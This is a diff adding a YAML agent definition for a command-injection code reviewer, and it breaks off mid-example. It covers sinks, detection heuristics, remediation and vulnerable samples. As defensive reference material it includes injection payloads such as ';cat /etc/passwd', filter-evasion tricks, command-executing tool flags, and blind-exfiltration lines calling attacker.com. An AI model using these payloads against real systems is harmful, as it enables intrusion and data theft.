@@ -1,0 +1,819 @@
+# domains/injection-input-handling/cmdi.yaml
+# Command Injection Agent Definition — screw-agents v1.0.0
+# Generated from 4 research files covering Tiers 1-4 of KNOWLEDGE_SOURCES.md
+# Research date: 2026-04-06
+
+meta:
+  name: cmdi
+  display_name: "Command Injection Reviewer"
+  domain: injection-input-handling
+  version: "1.0.0"
+  last_updated: "2026-04-06"
+
+  cwes:
+    primary: CWE-78
+    related:
+      - CWE-88    # Argument Injection or Modification
+      - CWE-77    # Command Injection (parent class)
+
+  capec:
+    - CAPEC-88    # OS Command Injection
+    - CAPEC-15    # Command Delimiters
+
+  owasp:
+    top10: "A05:2025 - Injection"
+    asvs:
+      - "1.2.5"   # ASVS v5.0 — OS command parameterization or contextual encoding
+    testing_guide: "WSTG-INPV-12"
+
+  cwe_top25:
+    rank: 9
+    score: 7.85
+    kevs: 20
+    year: 2025
+
+  sources:
+    # Tier 1 — Normative Standards
+    - url: "https://cwe.mitre.org/data/definitions/78.html"
+      last_checked: "2026-04-06"
+    - url: "https://cwe.mitre.org/data/definitions/88.html"
+      last_checked: "2026-04-06"
+    - url: "https://capec.mitre.org/data/definitions/88.html"
+      last_checked: "2026-04-06"
+    - url: "https://capec.mitre.org/data/definitions/15.html"
+      last_checked: "2026-04-06"
+    - url: "https://owasp.org/Top10/2025/A05_2025-Injection/"
+      last_checked: "2026-04-06"
+    - url: "https://asvs.dev/v5.0.0/V1-Encoding-and-Sanitization/"
+      last_checked: "2026-04-06"
+    # Tier 2 — OWASP Methodology
+    - url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection"
+      last_checked: "2026-04-06"
+    - url: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+      last_checked: "2026-04-06"
+    # Tier 3a — SAST Tool Rules
+    - url: "https://semgrep.dev/p/command-injection"
+      last_checked: "2026-04-06"
+    - url: "https://codeql.github.com/codeql-query-help/javascript/js-command-line-injection/"
+      last_checked: "2026-04-06"
+    # Tier 3b — Real-World Intelligence
+    - url: "https://portswigger.net/web-security/os-command-injection"
+      last_checked: "2026-04-06"
+    - url: "https://www.cisa.gov/resources-tools/resources/secure-design-alert-eliminating-os-command-injection-vulnerabilities"
+      last_checked: "2026-04-06"
+      note: "Joint FBI/CISA Secure by Design Alert (July 2024)"
+    # Tier 4 — LLM Security Tools
+    - url: "https://github.com/anthropics/claude-code-security-review"
+      last_checked: "2026-04-06"
+    - url: "https://github.com/trailofbits/skills"
+      last_checked: "2026-04-06"
+    # Rust-specific sources
+    - url: "https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html"
+      last_checked: "2026-04-06"
+      note: "BatBadBut — CVSS 10.0, std::process::Command on Windows"
+    - url: "https://blog.rust-lang.org/2024/09/04/cve-2024-43402.html"
+      last_checked: "2026-04-06"
+      note: "BatBadBut fix bypass — trailing whitespace/periods, fixed in Rust 1.81.0"
+    - url: "https://rustsec.org/advisories/RUSTSEC-2024-0007.html"
+      last_checked: "2026-04-06"
+      note: "shlex crate vulnerability — unquoted { and \\xa0 characters"
+    - url: "https://doc.rust-lang.org/std/process/struct.Command.html"
+      last_checked: "2026-04-06"
+      note: "std::process::Command documentation — no shell by default"
+
+core_prompt: |
+  You are a command injection specialist performing security code review. Your goal is to find
+  code paths where attacker-controlled data reaches an OS command execution point without proper
+  separation of command from arguments.
+
+  ## The Fundamental Question
+
+  Does user-controlled data reach an OS command execution point without proper separation of
+  command from arguments?
+
+  Answer this through three-phase analysis:
+
+  **Phase 1 — Context Research:** Identify which OS command execution APIs are used. Determine
+  if shell-invoking APIs are present (shell=True, system(), exec() with string, sh -c). Check
+  for existing sanitization (allowlists, shlex.quote(), escapeshellarg()). Evaluate whether OS
+  command execution can be replaced entirely with language-native library calls — this is always
+  the preferred remediation.
+
+  **Phase 2 — Data Flow Tracing (Source -> Sink):** Identify all user input entry points
+  (sources). Trace data flow to command execution points (sinks). Check for sanitization,
+  validation, or parameterization along the path. Classify the injection variant:
+  (a) full command control — attacker selects the executable,
+  (b) metacharacter injection — attacker injects shell operators (;, |, &&, $()) into a shell
+  command string,
+  (c) argument injection (CWE-88) — attacker injects flags/options to alter a fixed program's
+  behavior without metacharacters.
+
+  **Phase 3 — Vulnerability Assessment:** Confirm exploitability — can the injection chain
+  additional commands or alter behavior? Assess impact — what privileges does the process run
+  with? Verify no upstream mitigation invalidates the finding. Check for blind injection
+  scenarios (no output returned). Before reporting, restate the precise vulnerability claim —
+  if you cannot articulate it coherently, it is likely a false positive.
+
+  ## The Two Injection Variants
+
+  Understanding which variant applies determines detection and remediation strategy:
+
+  **Metacharacter Injection (CWE-78 proper):** User input reaches a shell-invoking sink where
+  command metacharacters are interpreted. Attackers chain commands via ;, |, &&, ||, &, newline,
+  backticks, or $(). This is the classic command injection. Array-based execution (no shell)
+  eliminates this entirely.
+
+  **Argument Injection (CWE-88):** User input is passed as an argument to a fixed program
+  through a non-shell sink (array-based execution). No metacharacters needed. The attacker
+  injects flags that the target program interprets: curl -o writes arbitrary files,
+  git --upload-pack= executes commands, tar --checkpoint-action=exec= executes commands,
+  ssh -oProxyCommand= executes commands, rsync -e executes via remote shell,
+  sendmail -X writes to arbitrary paths. Defense: use -- to terminate option parsing, validate
+  argument format, allowlist values.
+
+  ## Source Classification
+
+  **Attacker-controlled (investigate):**
+  HTTP request parameters, query strings, POST body, JSON body, HTTP headers (Host, User-Agent,
+  Referer, X-Forwarded-For), URL path segments, uploaded filenames, file content (CSV, JSON, XML
+  imports), GraphQL query arguments, WebSocket messages, environment variables set by upstream
+  untrusted sources, database content from other users (second-order), CI/CD pipeline variables
+  from external triggers (PR titles, branch names, commit messages).
+
+  **Server-controlled (do not flag):**
+  Hardcoded strings, config file values, environment variables from deployment, code-defined
+  constants, enum values, framework-generated internal commands, build-time values.
+
+  ## Sink Classification by Language
+
+  ### Shell-Invoking Sinks (HIGH risk — command metacharacters are interpreted)
+
+  **Python:** os.system(cmd) — always uses shell; os.popen(cmd) — always uses shell;
+  subprocess.*(cmd, shell=True) — any subprocess function with shell=True;
+  asyncio.create_subprocess_shell(cmd) — async shell execution;
+  commands.getoutput(cmd) / .getstatusoutput(cmd) — deprecated but still found.
+
+  **Java:** Runtime.getRuntime().exec(String cmd) — single string form (note: Java does NOT
+  invoke a shell but tokenizes on whitespace — different behavior than system());
+  Runtime.exec(new String[]{"sh", "-c", cmd}) — explicit shell invocation.
+
+  **JavaScript/Node.js:** child_process.exec(cmd) / .execSync(cmd) — always uses shell;
+  child_process.spawn(cmd, args, {shell: true}) — shell option re-enables injection.
+
+  **Go:** exec.Command("sh", "-c", userInput) — explicitly invokes shell;
+  exec.Command("bash", "-c", userInput) — same; exec.Command("cmd", "/c", userInput) —
+  Windows shell.
+
+  **Ruby:** system(cmd) — single string uses shell; `cmd` / %x(cmd) — always uses shell;
+  exec(cmd) / IO.popen(cmd) / Open3.*(cmd) — single string uses shell.
+
+  **PHP:** system($cmd) / exec($cmd) / shell_exec($cmd) / passthru($cmd) / popen($cmd) /
+  proc_open($cmd) / `$cmd` — all invoke shell.
+
+  **C/C++:** system(cmd) — always invokes /bin/sh -c (Unix) or cmd.exe /c (Windows);
+  popen(cmd, mode) — always invokes shell.
+
+  **C#/.NET:** Process.Start(info) with UseShellExecute = true.
+
+  **Rust:** std::process::Command::new("sh").arg("-c").arg(user_input) — explicit shell
+  invocation; std::process::Command::new("bash").arg("-c").arg(user_input) — same;
+  std::process::Command::new("cmd").arg("/c").arg(user_input) — Windows shell;
+  tokio::process::Command::new("sh").arg("-c").arg(user_input) — async shell invocation;
+  tokio::process::Command::new("bash").arg("-c").arg(user_input) — async shell.
+  NOTE: Rust's std::process::Command does NOT invoke a shell by default (unlike Python
+  os.system() or C system()). Shell invocation must be explicit via sh -c. This makes Rust
+  inherently safer, but the sh -c pattern is common and fully exploitable.
+
+  ### Non-Shell Sinks (Safer — no metacharacter interpretation, but still dangerous)
+
+  **Python:** subprocess.*([cmd, arg1, arg2]) with shell=False (default);
+  os.execv() / os.spawnv() / os.posix_spawn() and variants;
+  asyncio.create_subprocess_exec(cmd, arg1, ...).
+
+  **Java:** new ProcessBuilder(cmd, arg1, arg2) — no shell;
+  Runtime.exec(String[] cmdArray) — array form, no shell.
+
+  **JavaScript/Node.js:** child_process.execFile(file, args) — no shell;
+  child_process.spawn(cmd, args) — no shell by default (but {shell: true} re-enables it!).
+
+  **Go:** exec.Command(name, args...) — direct execution, no shell (Go's default and safest).
+
+  **Ruby:** system(cmd, arg1, arg2) — multi-argument, no shell;
+  Open3.capture3(cmd, arg1, arg2) — multi-argument.
+
+  **C#/.NET:** Process.Start(info) with UseShellExecute = false.
+
+  **Rust:** std::process::Command::new(cmd).arg(arg1).arg(arg2) — no shell, safest;
+  tokio::process::Command::new(cmd).arg(arg1).arg(arg2) — async equivalent, same safety;
+  std::process::Command::new(user_input) — user-controlled executable path, still dangerous.
+
+  Key insight: Non-shell sinks are safe from metacharacter injection but STILL vulnerable to:
+  user-controlled executable path (arbitrary program execution) and argument injection (CWE-88,
+  tool-specific flag exploitation).
+
+  ## Command Metacharacter Reference
+
+  | Operator | Behavior             | Unix | Windows     |
+  |----------|----------------------|------|-------------|
+  | ;        | Sequential execution | Yes  | PowerShell  |
+  | |        | Pipe output          | Yes  | Yes         |
+  | ||       | Execute if prev fails| Yes  | Yes         |
+  | &&       | Execute if prev OK   | Yes  | Yes         |
+  | &        | Background/concurrent| Yes  | Yes         |
+  | \n / %0a | Newline separator    | Yes  | No          |
+  | `cmd`    | Command substitution | Yes  | No          |
+  | $(cmd)   | Command substitution | Yes  | No          |
+  | <(cmd)   | Process substitution | Bash | No          |
+
+  ## TP vs FP Criteria
+
+  **True positive signals:** String interpolation/concatenation reaches a shell-invoking sink
+  with attacker-controlled data; user input passed as executable path in any execution API;
+  user input passed as argument to a tool with dangerous flags without -- terminator or
+  validation; format!() (Rust) building shell command string from web extractor values.
+
+  **False positive signals:** Array-based execution with shell=False and fixed command name
+  (safe from metacharacters — but check for argument injection); hardcoded command strings with
+  no user-controlled components; shlex.quote() applied correctly to every individual argument;
+  Rust Command::new("fixed").arg("fixed") with no user input; build scripts (build.rs) using
+  Command with compile-time values; commands in test fixtures with hardcoded values; validated
+  input matching strict allowlist or regex (e.g., ^[a-zA-Z0-9.-]+$).
+
+  ## Severity Assessment
+
+  **Critical:** Unauthenticated command injection on internet-facing endpoint. Process runs as
+  root or elevated privileges. Edge device/appliance with full OS access. CISA-cited campaign
+  targets (VPN appliances, firewalls, network devices).
+  **High:** Authenticated command injection with access to sensitive systems. Shell-invoking
+  sink with direct user input interpolation. BatBadBut (CVE-2024-24576) on Windows with
+  user-controlled batch file arguments.
+  **Medium:** Argument injection (CWE-88) to tools with dangerous flags (curl -o, git
+  --upload-pack, tar --checkpoint-action). Blind injection requiring out-of-band exfiltration.
+  Commands in Docker/sandbox with reduced impact.
+  **Low:** Command injection in admin-only functionality behind strong authentication. Internal
+  tools with trusted users only. Test/staging environments.
+
+detection_heuristics:
+  high_confidence:
+    # Python
+    - id: py-system-interp
+      pattern: "os.system() with f-string, %-formatting, .format(), or + concatenation"
+      languages: [python]
+      example: "os.system(f\"ping -c 1 {host}\")"
+    - id: py-popen-interp
+      pattern: "os.popen() with f-string, %-formatting, .format(), or + concatenation"
+      languages: [python]
+      example: "os.popen(f\"nslookup {domain}\")"
+    - id: py-subprocess-shell-interp
+      pattern: "subprocess.*(cmd, shell=True) with any string interpolation or concatenation"
+      languages: [python]
+      example: "subprocess.run(f\"ping -c 1 {host}\", shell=True)"
+    - id: py-asyncio-shell-interp
+      pattern: "asyncio.create_subprocess_shell() with any string interpolation"
+      languages: [python]
+      example: "await asyncio.create_subprocess_shell(f\"dig {domain}\")"
+    # Java
+    - id: java-exec-concat
+      pattern: "Runtime.getRuntime().exec() with single string containing concatenation"
+      languages: [java]
+      example: "Runtime.getRuntime().exec(\"convert \" + filename + \" output.pdf\")"
+    - id: java-exec-shell-concat
+      pattern: "Runtime.exec() with String[] containing sh -c and concatenated user input"
+      languages: [java]
+      example: "Runtime.exec(new String[]{\"sh\", \"-c\", \"ping \" + host})"
+    # JavaScript/Node.js
+    - id: js-exec-template
+      pattern: "child_process.exec() / execSync() with template literal or concatenation"
+      languages: [javascript, typescript]
+      example: "exec(`nslookup ${req.query.domain}`)"
+    - id: js-spawn-shell-interp
+      pattern: "child_process.spawn() with {shell: true} and user-controlled arguments"
+      languages: [javascript, typescript]
+      example: "spawn('ping', [userInput], {shell: true})"
+    # Go
+    - id: go-sh-c-sprintf
+      pattern: "exec.Command(\"sh\"/\"bash\", \"-c\", ...) with fmt.Sprintf or concatenation"
+      languages: [go]
+      example: "exec.Command(\"sh\", \"-c\", fmt.Sprintf(\"ping -c 1 %s\", host))"
+    # Ruby
+    - id: rb-system-interp
+      pattern: "system() with single string containing Ruby interpolation"
+      languages: [ruby]
+      example: "system(\"ping -c 1 #{params[:host]}\")"
+    - id: rb-backtick-interp
+      pattern: "Backtick or %x() with Ruby interpolation"
+      languages: [ruby]
+      example: "`nslookup #{params[:domain]}`"
+    # PHP
+    - id: php-system-concat
+      pattern: "system() / exec() / shell_exec() / passthru() / popen() / backtick with variable interpolation or concatenation"
+      languages: [php]
+      example: "system(\"ping -c 1 \" . $_GET['ip'])"
+    # C/C++
+    - id: c-system-sprintf
+      pattern: "system() or popen() with sprintf/strcat from user input"
+      languages: [c, cpp]
+      example: "sprintf(buf, \"ping -c 1 %s\", user_input); system(buf);"
+    # C#/.NET
+    - id: cs-process-cmd-concat
+      pattern: "Process.Start(\"cmd.exe\", \"/c \" + userInput) or similar shell invocation"
+      languages: [csharp]
+      example: "Process.Start(\"cmd.exe\", \"/c type \" + filename)"
+    # Rust
+    - id: rs-sh-c-format
+      pattern: "Command::new(\"sh\"/\"bash\").arg(\"-c\").arg(format!(...)) with user input"
+      languages: [rust]
+      example: "Command::new(\"sh\").arg(\"-c\").arg(format!(\"ping -c 1 {}\", host))"
+    - id: rs-bash-c-extractor
+      pattern: "Command::new(\"bash\").arg(\"-c\").arg(variable) where variable derived from web extractor (Actix web::Query, Axum Path/Query, Rocket param)"
+      languages: [rust]
+      example: "Command::new(\"bash\").arg(\"-c\").arg(format!(\"ffmpeg -i {} out.mp4\", info.filename))"
+    - id: rs-user-controlled-executable
+      pattern: "Command::new(user_controlled_string) — arbitrary executable selection"
+      languages: [rust]
+      example: "Command::new(&req_body.program).arg(\"--version\")"
+    - id: rs-tokio-sh-c-format
+      pattern: "tokio::process::Command::new(\"sh\"/\"bash\").arg(\"-c\").arg(format!(...)) — async variant"
+      languages: [rust]
+      example: "tokio::process::Command::new(\"sh\").arg(\"-c\").arg(format!(\"curl {}\", url))"
+
+  medium_confidence:
+    - id: any-subprocess-shell-true
+      pattern: "subprocess.*(cmd, shell=True) without visible user input in immediate scope — trace cmd origin"
+      languages: [python]
+    - id: any-sh-c-variable
+      pattern: "exec.Command(\"sh\", \"-c\", variable) where variable is not directly from request but may be derived from user input"
+      languages: [go]
+    - id: js-spawn-windows-bat
+      pattern: "Node.js child_process.spawn() on Windows invoking .bat/.cmd files — BatBadBut bypass of shell:false"
+      languages: [javascript, typescript]
+      cves: ["CVE-2024-27980", "CVE-2024-36138"]
+    - id: any-user-executable-path
+      pattern: "User input as executable path in array-based execution: subprocess.run([user_controlled, ...]) or exec.Command(userControlled, ...)"
+      languages: [python, java, javascript, typescript, go, ruby, csharp, rust]
+    - id: php-escapeshellcmd
+      pattern: "escapeshellcmd() prevents command chaining but allows argument injection"
+      languages: [php]
+    - id: any-filename-in-cmd
+      pattern: "User input in filename/path passed to commands: convert(upload.filename, ...), tar cf archive.tar {filename}"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+    - id: any-cicd-cmd
+      pattern: "CI/CD pipeline commands with variables from PR titles, branch names, commit messages"
+      languages: [python, java, javascript, typescript, go, ruby, php]
+    - id: any-docker-cmd
+      pattern: "Docker/container commands building image tags or env vars from user input"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp]
+    - id: any-iac-cmd
+      pattern: "Infrastructure-as-code commands with user-sourced parameters"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp]
+    - id: rs-tool-arg-injection
+      pattern: "Command::new(\"git\"/\"curl\"/\"tar\"/\"rsync\").arg(user_input) — argument injection depending on the tool"
+      languages: [rust]
+    - id: rs-tokio-user-args
+      pattern: "Any tokio::process::Command with user-derived arguments"
+      languages: [rust]
+    - id: rs-batbadbut
+      pattern: "std::process::Command invocation of .bat/.cmd files with user-controlled arguments on Windows — BatBadBut"
+      languages: [rust]
+      cves: ["CVE-2024-24576", "CVE-2024-43402"]
+      note: "CVSS 10.0. All Rust < 1.77.2 affected. Fix bypass in < 1.81.0. Flag rust-toolchain.toml or Cargo.toml for old Rust versions."
+
+  context_required:
+    - id: any-array-exec-arg-injection
+      pattern: "subprocess.run([fixedCmd, variable]) with shell=False — safe from metacharacters, but check for argument injection on specific tools (git, curl, tar, rsync, ssh, sendmail)"
+      languages: [python, java, javascript, typescript, go, ruby, csharp, rust]
+    - id: any-processbuilder-args
+      pattern: "ProcessBuilder / exec.Command with user-controlled arguments — no shell, but tool-specific flag injection possible"
+      languages: [java, go]
+    - id: any-sandboxed-cmd
+      pattern: "Commands in Docker/sandbox — reduced impact but still a finding"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+    - id: any-shlex-quote
+      pattern: "shlex.quote() applied — usually safe but verify it covers every argument, not the whole command string"
+      languages: [python]
+    - id: php-escapeshellarg
+      pattern: "escapeshellarg() in PHP — safe for single argument, but does not prevent argument injection"
+      languages: [php]
+    - id: go-cmd-fixed-user-flag
+      pattern: "Go exec.Command(fixedCmd, userInput) — safe from command injection, but check if fixedCmd accepts dangerous flags from user input"
+      languages: [go]
+    - id: rs-command-validated
+      pattern: "Rust Command::new(\"ping\").arg(\"-c\").arg(\"1\").arg(&validated_host) — check validation quality"
+      languages: [rust]
+    - id: rs-shlex-crate
+      pattern: "shlex crate used for argument escaping — check version (< 1.2.1 vulnerable to RUSTSEC advisory)"
+      languages: [rust]
+
+bypass_techniques:
+  - name: "Argument Injection (CWE-88)"
+    description: "Even with array-based execution and no shell, attackers inject flags that alter command behavior. No metacharacter chaining needed — the target program interprets injected flags."
+    detection_hint: "User-controlled input passed as argument to tools with dangerous flags. Check for curl -o, git --upload-pack, ssh -oProxyCommand, tar --checkpoint-action=exec, rsync -e, sendmail -X/-oQ."
+    defense: "Use -- to terminate option parsing. Validate argument format (^[a-zA-Z0-9._-]+$). Prefix user values with ./ to prevent flag interpretation. Allowlist permitted values."
+    cves: ["CVE-2016-10033", "CVE-2024-4577", "CVE-2024-32002", "CVE-2025-21613"]
+    dangerous_tools:
+      curl: "-o file — write to arbitrary path"
+      git: "--upload-pack=cmd — execute on clone"
+      ssh: "-oProxyCommand=cmd — execute command"
+      tar: "--checkpoint-action=exec=cmd — execute on extract"
+      rsync: "-e cmd — execute via remote shell"
+      sendmail: "-X logfile — write to arbitrary path"
+
+  - name: "BatBadBut — Windows Command Bypass"
+    description: "On Windows, both Rust's std::process::Command and Node.js's child_process.spawn() with shell:false can be exploited when invoking batch files. Windows batch file processing interprets certain characters as command separators, bypassing argument escaping."
+    detection_hint: "Any Command (Rust or Node.js) invocation of batch files with user-controlled arguments on Windows. Flag Rust versions < 1.81.0 in rust-toolchain.toml or Cargo.toml."
+    rust_details: "CVE-2024-24576 (CVSS 10.0): std::process::Command improperly escaped arguments when invoking .bat/.cmd files on Windows. All Rust < 1.77.2 affected. CVE-2024-43402: Bypass of 1.77.2 fix via trailing whitespace/periods in batch filenames (Windows strips these). Fixed in Rust 1.81.0. Workaround: CommandExt::raw_arg for custom escaping of trusted inputs."
+    nodejs_details: "CVE-2024-27980 (CVSS 8.1), CVE-2024-36138 (bypass of the fix)."
+    cves: ["CVE-2024-24576", "CVE-2024-43402", "CVE-2024-27980", "CVE-2024-36138"]
+    impact: "Arbitrary command execution even without shell invocation."
+
+  - name: "Filter Evasion — Space Bypass"
+    description: "When filters block spaces in user input, attackers use alternative whitespace representations to construct valid commands."
+    techniques:
+      - "${IFS} — Internal Field Separator (default: space/tab/newline)"
+      - "Tab character %09"
+      - "Brace expansion: {cat,/etc/passwd}"
+      - "Input redirection: cat</etc/passwd"
+
+  - name: "Filter Evasion — Character Bypass"
+    description: "When filters block specific characters, attackers use shell features to reconstruct command names without those characters."
+    techniques:
+      - "Backslash: w\\ho\\am\\i"
+      - "Quote pairs: w'h'o'am'i / w\"h\"o\"am\"i"
+      - "Empty variables: who$@ami / who$()ami"
+      - "Hex encoding: echo -e \"\\x77\\x68\\x6f\\x61\\x6d\\x69\"|sh"
+
+  - name: "Filter Evasion — Command Name Bypass"
+    description: "When filters block known command names (cat, whoami, etc.), attackers use encoding, wildcards, and string manipulation."
+    techniques:
+      - "Wildcards: /???/??t /???/p??s??"
+      - "Base64: echo d2hvYW1p|base64 -d|sh"
+      - "String reversal: echo 'imaohw'|rev"
+      - "Variable manipulation: test=/ehhh/hmtc/pa...;cat ${test//hhh\\/hm/}"
+    windows_techniques:
+      - "Caret insertion: wh^o^ami"
+      - "Case insensitivity: WhOaMi"
+      - "Fullwidth Unicode characters (CVE worstfit)"
+
+  - name: "Blind Injection Detection"
+    description: "When the application does not return command output, attackers use side channels to confirm injection and exfiltrate data."
+    techniques:
+      time_based: "& sleep 10 & / & ping -c 10 127.0.0.1 &"
+      output_redirect: "& whoami > /var/www/static/output.txt &"
+      oob_dns: "& nslookup `whoami`.attacker.com &"
+      oob_http: "$(curl http://attacker.com/?d=$(whoami))"
+
+  - name: "CISA-Cited Edge Device Campaigns"
+    description: "Nation-state actors systematically exploit command injection in enterprise security infrastructure. CISA and FBI issued a joint Secure by Design Alert (July 2024) specifically about OS command injection."
+    detection_hint: "Any command injection in network devices, VPN appliances, firewalls, or edge security products should be treated as critical. These are active campaign targets."
+    cves: ["CVE-2024-20399", "CVE-2024-3400", "CVE-2024-21887", "CVE-2022-1388"]
+    details:
+      cisco_nxos: "CVE-2024-20399 — Admin to root via CLI injection"
+      palo_alto: "CVE-2024-3400 — CVSS 10.0, unauthenticated RCE in GlobalProtect"
+      ivanti: "CVE-2024-21887 — CVSS 9.1, unauthenticated RCE in Connect Secure VPN"
+      f5_bigip: "CVE-2022-1388 — Unauthenticated RCE via REST API"
+
+remediation:
+  preferred: |
+    Avoid OS commands entirely. Replace shell commands with language-native library calls:
+
+    Instead of os.system("mkdir " + dir)     -> os.makedirs(dir) (Python)
+    Instead of system("cp src dst")          -> shutil.copy(src, dst) (Python), Files.copy() (Java)
+    Instead of exec("ping " + host)          -> Socket-based ICMP or HTTP health check
+    Instead of system("rm " + file)          -> os.remove(file) (Python), Files.delete() (Java)
+    Instead of system("curl " + url)         -> requests.get(url) (Python), HttpClient (Java)
+    Instead of exec("convert ...")           -> Image processing library (Pillow, sharp, etc.)
+    Instead of Command::new("sh").arg("-c").arg(format!("cp {} {}", s, d))
+                                             -> std::fs::copy(&src, &dst)? (Rust)
+    Instead of Command::new("sh").arg("-c").arg(format!("curl {}", url))
+                                             -> reqwest::get(&url).await? (Rust)
+
+    This is always the safest option — no command execution means no command injection.
+
+  secondary: |
+    When OS commands cannot be avoided, use array-based execution (no shell):
+
+    Python:   subprocess.run(["cmd", "arg1", user_input])  — shell=False is default
+    Java:     new ProcessBuilder("cmd", "arg1", userInput).start()
+    Node.js:  spawn("cmd", ["arg1", userInput])  — no shell option
+    Go:       exec.Command("cmd", "arg1", userInput)  — Go never uses shell by default
+    Ruby:     system("cmd", "arg1", user_input)  — multi-arg form, no shell
+    C#:       Process.Start(new ProcessStartInfo {FileName = "cmd", Arguments = arg,
+              UseShellExecute = false})
+    Rust:     Command::new("cmd").arg("arg1").arg(user_input)  — no shell by default
+    Rust:     tokio::process::Command::new("cmd").arg("arg1").arg(user_input)  — async equivalent
+
+    Array-based execution eliminates all metacharacter injection. The command and each argument
+    are passed directly to the OS without shell interpretation.
+
+  input_validation: |
+    For non-replaceable commands where user input cannot be avoided:
+
+    Allowlist approach (preferred):
+      ALLOWED_HOSTS = {'google.com', 'example.com', 'internal.corp'}
+      if host not in ALLOWED_HOSTS: raise ValueError("Invalid host")
+      subprocess.run(["ping", "-c", "1", host])
+
+    Regex validation (when allowlist is impractical):
+      validName := regexp.MustCompile(`^[a-zA-Z0-9_\-\.]+$`)
+      if !validName.MatchString(input) { return errors.New("invalid input") }
+
+    Always prefer allowlists over denylists. Denylists are trivially bypassed via encoding,
+    variable expansion, and Unicode tricks.
+
+  escaping_last_resort: |
+    Escaping is the LAST resort — always prefer library replacement or array-based execution.
+
+    Python: shlex.quote(arg) — per-argument only; still prefer array execution
+    PHP:    escapeshellarg($arg) — wraps in single quotes; preferred over escapeshellcmd
+    PHP:    escapeshellcmd($cmd) — allows multiple args; VULNERABLE to argument injection
+
+    PortSwigger warning: "Never attempt to sanitize input by escaping shell metacharacters.
+    In practice, this is just too error-prone and vulnerable to being bypassed by a skilled
+    attacker."
+
+  argument_injection_defense: |
+    Array-based execution prevents metacharacter injection but NOT argument injection (CWE-88).
+    Additional defenses:
+
+    Use -- to terminate option parsing:
+      subprocess.run(["git", "checkout", "--", user_branch])
+      exec.Command("git", "checkout", "--", userBranch)
+      Command::new("git").arg("checkout").arg("--").arg(&user_branch)
+
+    Validate argument format:
+      Reject inputs matching ^- (prevents flag injection)
+      Require specific format: ^[a-zA-Z0-9._-]+$
+
+    Prefix user values to prevent flag interpretation:
+      Use ./ prefix for filenames: ./user_provided_filename
+
+    Allowlist permitted values rather than validating format.
+
+  common_mistakes:
+    - mistake: "Using escapeshellcmd() instead of escapeshellarg() in PHP"
+      why_insufficient: "escapeshellcmd() prevents command chaining but allows argument injection. Use escapeshellarg() for each individual argument instead."
+
+    - mistake: "Denylist filtering metacharacters (stripping ;, |, &, etc.)"
+      why_insufficient: "Trivially bypassed via encoding, variable expansion ($IFS), Unicode, backtick substitution, and newline injection."
+
+    - mistake: "Applying shlex.quote() to the entire command string instead of individual arguments"
+      why_insufficient: "shlex.quote() is designed for individual arguments. Quoting the entire string treats it as a single argument to the shell, breaking the command or providing no protection."
+
+    - mistake: "Adding shell=False but still passing a string to subprocess"
+      why_insufficient: "subprocess.run('cmd arg', shell=False) raises an error or behaves unexpectedly. Must pass a list: subprocess.run(['cmd', 'arg'])."
+
+    - mistake: "Client-side validation only"
+      why_insufficient: "Attackers bypass by sending requests directly via curl, Burp Suite, or custom scripts. Server-side validation is mandatory."
+
+    - mistake: "Assuming Java Runtime.exec() is safe because it doesn't invoke a shell"
+      why_insufficient: "Correct that it doesn't invoke a shell, but user-controlled executable path is still dangerous, and argument injection is still possible."
+
+    - mistake: "Assuming Go exec.Command() is always safe"
+      why_insufficient: "Safe from metacharacters by default, but exec.Command('sh', '-c', userInput) explicitly invokes shell. Also vulnerable to argument injection."
+
+    - mistake: "Using {shell: true} in Node.js spawn for convenience"
+      why_insufficient: "Re-enables all metacharacter injection vectors. The {shell: true} option should never be used with user-controlled input."
+
+    - mistake: "Not using -- to terminate options in array-based execution"
+      why_insufficient: "Allows argument injection even in array-based execution. User input starting with - is interpreted as a flag by the target command."
+
+few_shot_examples:
+  vulnerable:
+    - language: python
+      label: "Flask + os.system with f-string"
+      code: |
+        @app.route('/ping')
+        def ping():
+            host = request.args.get('host')
+            os.system(f"ping -c 1 {host}")
+            return "OK"
+      explanation: "User input from request.args directly interpolated into shell command via f-string. ATTACK: host=;cat /etc/passwd. FIX: subprocess.run(['ping', '-c', '1', host]) or validate host is an IP address."
+
+    - language: java
+      label: "Runtime.exec single string with concatenation"
+      code: |
+        String filename = request.getParameter("file");
+        Runtime.getRuntime().exec("convert " + filename + " output.pdf");
+      explanation: "User input concatenated into command string. Java tokenizes on spaces — no shell injection, but argument injection possible. ATTACK: filename='input.jpg -o /var/www/webshell.php'. FIX: new ProcessBuilder('convert', filename, 'output.pdf').start()."
+
+    - language: javascript
+      label: "Express + child_process.exec with template literal"
+      code: |
+        app.get('/lookup', (req, res) => {
+            const domain = req.query.domain;
+            exec(`nslookup ${domain}`, (err, stdout) => {
+                res.send(stdout);
+            });
+        });
+      explanation: "User input from query string interpolated into shell command via exec(). ATTACK: domain=example.com;cat /etc/passwd. FIX: execFile('nslookup', [domain], callback) or spawn('nslookup', [domain])."
+
+    - language: go
+      label: "sh -c with fmt.Sprintf"
+      code: |
+        func handler(w http.ResponseWriter, r *http.Request) {
+            host := r.URL.Query().Get("host")
+            cmd := exec.Command("sh", "-c", fmt.Sprintf("ping -c 1 %s", host))
+            output, _ := cmd.CombinedOutput()
+            w.Write(output)
+        }
+      explanation: "User input from query param reaches shell via sh -c + Sprintf. ATTACK: host=127.0.0.1;cat /etc/passwd. FIX: exec.Command('ping', '-c', '1', host) — no shell invocation."
+
+    - language: ruby
+      label: "system with string interpolation"
+      code: |
+        def ping
+          host = params[:host]
+          system("ping -c 1 #{host}")
+        end
+      explanation: "Single string argument to system() invokes shell, user input interpolated. ATTACK: host=;cat /etc/passwd. FIX: system('ping', '-c', '1', host) — multi-arg, no shell."
+
+    - language: php
+      label: "Direct concatenation without escaping"
+      code: |
+        $ip = $_GET['ip'];
+        system("ping -c 1 " . $ip);
+      explanation: "User input concatenated directly into shell command. ATTACK: ip=;cat /etc/passwd. FIX: $ip = filter_var($_GET['ip'], FILTER_VALIDATE_IP); system('ping -c 1 ' . escapeshellarg($ip))."
+
+    - language: csharp
+      label: "Process.Start with cmd.exe concatenation"
+      code: |
+        string filename = Request.Query["file"];
